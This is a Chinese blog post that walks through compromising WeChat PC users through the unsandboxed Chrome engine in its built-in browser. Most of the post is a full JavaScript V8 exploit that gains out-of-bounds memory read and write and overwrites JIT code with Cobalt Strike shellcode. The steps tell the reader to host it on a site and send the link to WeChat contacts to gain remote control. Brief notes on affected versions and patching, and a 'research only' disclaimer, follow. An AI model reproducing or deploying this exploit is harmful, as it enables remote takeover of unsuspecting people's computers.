# 利用微信内置浏览器Chrome漏洞实现远控
环境：微信PC版本3.2.1.112

![](%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8Chrome%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E8%BF%9C%E6%8E%A7/watermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ5NjA1OTc1%2Csize_16%2Ccolor_FFFFFF%2Ct_70.png)

利用步骤：  
1.首先使用CobaltStrike生成一个x86格式的shellcode。  
 

![](%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8Chrome%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E8%BF%9C%E6%8E%A7/1_watermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ5NjA1OTc1%2Csize_16%2Ccolor_FFFFFF%2Ct_70.png)

  
2.搭建一个测试网站，将下方0day poc放入。

![](%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8Chrome%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E8%BF%9C%E6%8E%A7/2021041721422479.png)

![](%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8Chrome%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E8%BF%9C%E6%8E%A7/2021041721451182.png)

    ENABLE_LOG = true;
    IN_WORKER = true;
    
    
    var shellcode = [shellcode];
    function print(data) {
    }
    
    
    var not_optimised_out = 0;
    var target_function = (function (value) {
        if (value == 0xdecaf0) {
            not_optimised_out += 1;
        }
        not_optimised_out += 1;
        not_optimised_out |= 0xff;
        not_optimised_out *= 12;
    });
    
    for (var i = 0; i < 0x10000; ++i) {
        target_function(i);
    }
    
    
    var g_array;
    var tDerivedNCount = 17 * 87481 - 8;
    var tDerivedNDepth = 19 * 19;
    
    function cb(flag) {
        if (flag == true) {
            return;
        }
        g_array = new Array(0);
        g_array[0] = 0x1dbabe * 2;
        return 'c01db33f';
    }
    
    function gc() {
        for (var i = 0; i < 0x10000; ++i) {
            new String();
        }
    }
    
    function oobAccess() {
        var this_ = this;
        this.buffer = null;
        this.buffer_view = null;
    
        this.page_buffer = null;
        this.page_view = null;
    
        this.prevent_opt = [];
    
        var kSlotOffset = 0x1f;
        var kBackingStoreOffset = 0xf;
    
        class LeakArrayBuffer extends ArrayBuffer {
            constructor() {
                super(0x1000);
                this.slot = this;
            }
        }
    
        this.page_buffer = new LeakArrayBuffer();
        this.page_view = new DataView(this.page_buffer);
    
        new RegExp({ toString: function () { return 'a' } });
        cb(true);
    
        class DerivedBase extends RegExp {
            constructor() {
                
                super(
                    
                    
                    {
                        toString: cb
                    }, 'g'
                    
                    
                );
    
                
                
                this_.buffer = new ArrayBuffer(0x80);
                g_array[8] = this_.page_buffer;
            }
        }
    
        
        var derived_n = eval(`(function derived_n(i) {
            if (i == 0) {
                return DerivedBase;
            }
    
            class DerivedN extends derived_n(i-1) {
                constructor() {
                    super();
                    return;
                    ${"this.a=0;".repeat(tDerivedNCount)}
                }
            }
    
            return DerivedN;
        })`);
    
        gc();
    
    
        new (derived_n(tDerivedNDepth))();
    
        this.buffer_view = new DataView(this.buffer);
        this.leakPtr = function (obj) {
            this.page_buffer.slot = obj;
            return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt);
        }
    
        this.setPtr = function (addr) {
            this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt);
        }
    
        this.read32 = function (addr) {
            this.setPtr(addr);
            return this.page_view.getUint32(0, true, ...this.prevent_opt);
        }
    
        this.write32 = function (addr, value) {
            this.setPtr(addr);
            this.page_view.setUint32(0, value, true, ...this.prevent_opt);
        }
    
        this.write8 = function (addr, value) {
            this.setPtr(addr);
            this.page_view.setUint8(0, value, ...this.prevent_opt);
        }
    
        this.setBytes = function (addr, content) {
            for (var i = 0; i < content.length; i++) {
                this.write8(addr + i, content[i]);
            }
        }
        return this;
    }
    
    function trigger() {
        var oob = oobAccess();
    
        var func_ptr = oob.leakPtr(target_function);
        print('[*] target_function at 0x' + func_ptr.toString(16));
    
        var kCodeInsOffset = 0x1b;
    
        var code_addr = oob.read32(func_ptr + kCodeInsOffset);
        print('[*] code_addr at 0x' + code_addr.toString(16));
    
        oob.setBytes(code_addr, shellcode);
    
        target_function(0);
    }
    
    try{
        print("start running");
        trigger();
    }catch(e){
        print(e);
    }
    
    End...

3.微信发送给任意好友，在pc端用内置浏览器打开url即可成功上线。  
 

![](%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8Chrome%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E8%BF%9C%E6%8E%A7/20210417214359619.png)

![](%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8Chrome%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E8%BF%9C%E6%8E%A7/2021041721441062.png)

  
4.使用CobaltStrike工具即可实现远控等一系列操作，CobaltStrike简介及使用教程请看我的另一篇文章：[http://blog.tianles.com/71.html](http://blog.tianles.com/71.html)

漏洞产生原因：  
微信内置浏览器为QQ浏览器，QQ浏览器使用chrome内核且沙箱处于关闭状态。

注：微信关闭网页shell会掉问题，可进程迁移解决。

影响范围：  
微信PC版：3.2.1.141版本及以下  
使用chrome内核89.0.4389.114以下版本的浏览器（edge，360浏览器，google chrome，谷歌浏览器等）

预防措施：  
将微信升级至3.2.1.141版本以上，不点击陌生链接。

截至发文日期：2021.4.17，最新版微信内核仍未更新，仍然可以使用其他手段来绕过，从而实现远控！

![](%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8Chrome%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E8%BF%9C%E6%8E%A7/watermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ5NjA1OTc1%2Csize_16%2Ccolor_FFFFFF%2Ct_70.dat)

本文提供的poc仅供技术研究使用，请勿非法使用。  
本文部分内容参考靓仔Jaky的公众号文章，在此特别感谢靓仔。

* * *

> 本文链接：[http://blog.tianles.com/99.html](http://blog.tianles.com/99.html)
> 
> 天乐原创文章，转载请注明出处！